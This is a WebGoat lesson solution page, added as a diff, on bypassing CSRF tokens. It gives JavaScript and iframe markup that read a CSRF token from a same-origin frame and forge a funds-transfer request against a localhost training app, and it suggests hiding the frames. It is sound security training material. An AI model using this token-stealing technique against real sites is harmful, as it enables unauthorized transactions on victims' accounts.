@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>CSRF Token By-Pass</title>
+<link rel="stylesheet" type="text/css" href="lesson_solutions/formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b>CSRF Token Prompt By-Pass</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+This lesson teaches how to perform CSRF attacks on sites that use tokens to mitigate CSRF attacks, but are vulnerable to CSS attacks.
+</p> 
+
+<p>
+Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into 
+loading a page that contains a 'forged request' to execute commands with the 
+victim's credentials.  </p>
+
+<p>Token-based request authentication deters these attacks.  This technique 
+inserts tokens into pages that issue requests.  These tokens are required to 
+complete a request, and help verify that requests are not scripted.  CSRFGuard from OWASP uses 
+this technique to help prevent CSRF attacks.</p>
+
+<p>However, this technique can be by-passed if CSS vulnerabilities exist on the same site.  
+Because of the same-origin browser policy, pages from the same domain can read content from 
+other pages from the same domain.  </p>
+
+<p><b>General Goal(s):</b><br/>
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains a malicious 
+request to transfer funds.  To successfully complete you need to obtain a valid request token.  The 
+URL that presents the transfer funds form is the same as the CSRF lesson with an extra parameter 
+"transferFunds=main".  Load this page, read the token and append the token in a forged request 
+to transferFunds. When you think the attack is successful, refresh the page and you will find the 
+green check on the left hand side menu.<br/>
+<b>Note that the "Screen" and "menu" GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</b>
+</p>
+
+<b>Solution:</b><br/>
+
+<p>Similar to the CSRF LAB, you must forge a request that will transfer funds.  However,
+a request will not result in a transfer of funds unless it has a correct token.  To find
+a valid token, you could look at the form that the site generates to submit a transfer of funds.   
+To see the transfer funds page, try typing in the URL of the Lesson with the extra parameter 
+of "transferFunds=main" <br/>   
+ 
+<img src="lesson_solutions/CsrfTokenByPass_files/tokenPage.png" alt="Picture of transfer initiation form" /><br>
+<font size="2"><b>Transfer initiation form</b></font>
+</p>
+<p>
+Next look at the source of the page to see what parameter the token comes in. 
+<code>
+<pre id="line538"><span class="start-tag">&lt;form</span><span class="attribute-name"> accept-charset</span>=<span class="attribute-value">'UNKNOWN' </span><span class="attribute-name">id</span>=<span class="attribute-value">'transferForm' </span><span class="attribute-name">method</span>=<span class="attribute-value">'POST' </span><span class="attribute-name">action</span>=<span class="attribute-value">'attack?Screen=2&amp;menu=900' </span><span class="attribute-name">enctype</span>=<span class="attribute-value">'application/x-www-form-urlencoded'</span>&gt;
+	&lt;<span class="start-tag">input</span><span class="attribute-name"> name</span>=<span class="attribute-value">'transferFunds' </span><span class="attribute-name">type</span>=<span class="attribute-value">'text' </span><span class="attribute-name">value</span>=<span class="attribute-value">'0'</span>&gt;
+	&lt;<span class="start-tag">input</span><span class="attribute-name"> name</span>=<span class="attribute-value">'CSRFToken' </span><span class="attribute-name">type</span>=<span class="attribute-value">'hidden' </span><span class="attribute-name">value</span>=<span class="attribute-value">'1745740650'</span>&gt;
+	&lt;<span class="start-tag">input</span><span class="attribute-name"> type</span>=<span class="attribute-value">'submit'</span>&gt;
+</pre><pre id="line555">&lt;/<span class="end-tag">form</span>&gt;</pre>
+</code>
+From this we see a forged command will need the <i>CSRFToken</i> parameter. <br/>
+
+<p>This solution loads this page in an iframe and reads the token out of the frame.  
+Note that this is possible because the message originates from the same domain and 
+does not violate the "same origin policy".  So even thought this page has taken 
+measures to prevent CSRF attacks, those measures can be side-stepped because of 
+CSS vulnerabilites.  To pull out the CSRFToken, the following javascript locates the 
+frame, then the form, then saves the token </p>
+
+<code><pre>
+var tokenvalue;
+
+function readFrame1()
+{
+    var frameDoc = document.getElementById("frame1").contentDocument;
+    var form = frameDoc.getElementsByTagName("form")[1];
+    var token = form.CSRFToken.value;
+    tokenvalue = '&CSRFToken='+token;
+    
+    loadFrame2();
+}
+
+function loadFrame2()
+{
+    var testFrame = document.getElementById("frame2");
+    testFrame.src="http://localhost:8080/WebGoat/attack?Screen=212&menu=900&transferFunds=4000"+tokenvalue;	
+}
+</pre></code>
+
+<p>readFrame1 will read the frame's content for the CSRFToken, save it and then call loadFrame2
+LoadFrame2 will then append the token and load a second frame. </p>
+
+The following frames loads the transfer page in the first frame.  When it finishes loading, it will
+call readFrame1, which calls loadFrame2, which then sets the src for the second iframe.
+
+<code><pre></pre></code>
+
+
+<code>
+<pre id="line585">&lt;<span class="start-tag">iframe</span><span class="attribute-name">	src</span>=<span class="attribute-value">"http://localhost:8080/WebGoat/attack?Screen=212&amp;menu=900&amp;transferFunds=main"
+	</span><span class="attribute-name">onload</span>=<span class="attribute-value">"readFrame1();"
+	</span><span class="attribute-name">id</span>=<span class="attribute-value">"frame1" </span><span class="attribute-name">frameborder</span>=<span class="attribute-value">"1" </span><span class="attribute-name">marginwidth</span>=<span class="attribute-value">"0"
+	</span><span class="attribute-name">marginheight</span>=<span class="attribute-value">"0" </span><span class="attribute-name">width</span>=<span class="attribute-value">"800" </span><span class="attribute-name">scrolling</span>=<span class="attribute-value">yes </span><span class="attribute-name">height</span>=<span class="attribute-value">"300"</span>&gt;&lt;/<span class="end-tag">iframe</span>&gt;
+&lt;<span class="start-tag">iframe</span><span class="attribute-name"> id</span>=<span class="attribute-value">"frame2" </span><span class="attribute-name">frameborder</span>=<span class="attribute-value">"1" </span><span class="attribute-name">marginwidth</span>=<span class="attribute-value">"0"
+	</span><span class="attribute-name">marginheight</span>=<span class="attribute-value">"0" </span><span class="attribute-name">width</span>=<span class="attribute-value">"800" </span><span class="attribute-name">scrolling</span>=<span class="attribute-value">yes </span><span class="attribute-name">height</span>=<span class="attribute-value">"300"</span>&gt;&lt;/<span class="end-tag">iframe</span>&gt;
+</pre>
+</code>
+
+<p>The next picture shows inserting this code into a message:<br/>
+<img src="lesson_solutions/CsrfTokenByPass_files/tokenHack.png" alt="Picture of inserting CSRF code in web page" /><br>
+<font size="2"><b>Inserting CSRF code into message</b></font><br/><br/>
+
+The following picture shows the results of someone hitting this page.  Note that no effort was taken to 
+hide the results of the two frames. The first frame shows the transfer funds form, and the second shows 
+the results of the CSRF attack.  Try another post that will hide these iframes from being noticed.
+<p>The next picture shows inserting this code into a message:<br/>
+<img src="lesson_solutions/CsrfTokenByPass_files/tokenHacked.png" alt="Picture of the results of viewing the malicious message" /><br>
+<font size="2"><b>Results of viewing the malicious message</b></font>
+
+
+</p>
+    
+</body>
+</html>
